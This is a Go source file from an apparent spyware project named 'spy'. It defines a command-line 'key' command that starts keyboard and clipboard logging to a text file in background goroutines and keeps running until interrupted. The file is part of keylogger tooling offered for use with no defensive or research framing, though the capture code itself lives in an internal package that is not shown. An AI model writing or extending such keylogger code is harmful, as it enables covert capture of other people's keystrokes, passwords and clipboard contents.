package cmd

import (
	"os"
	"os/signal"

	"github.com/cinus-e/spy/internal/keylogger"
	"github.com/cinus-e/spy/internal/util"
	"github.com/urfave/cli/v2"
)

var Key = &cli.Command{
	Name:  "key",
	Usage: "Keyboard and clipboard logger",
	Flags: []cli.Flag{
		&cli.BoolFlag{
			Name:     "keyboard",
			Aliases:  []string{"k"},
			Required: true,
			Usage:    "Enable keyboard logging",
		},
		&cli.BoolFlag{
			Name:     "clipboard",
			Aliases:  []string{"c"},
			Required: true,
			Usage:    "Enable clipboard logging",
		},
	},
	Action: KeyAction,
}

func KeyAction(c *cli.Context) error {
	logger, err := keylogger.NewKeylogger(util.FileNameFormat("key", ".txt"),
		c.Bool("keyboard"), c.Bool("clipboard"))
	if err != nil {
		return err
	}
	go logger.RunKeyboardLogger()
	go logger.RunClipboardLogger()
	sig := make(chan os.Signal)
	signal.Notify(sig, os.Interrupt, os.Kill)
	<-sig
	logger.Close()
	return nil
}
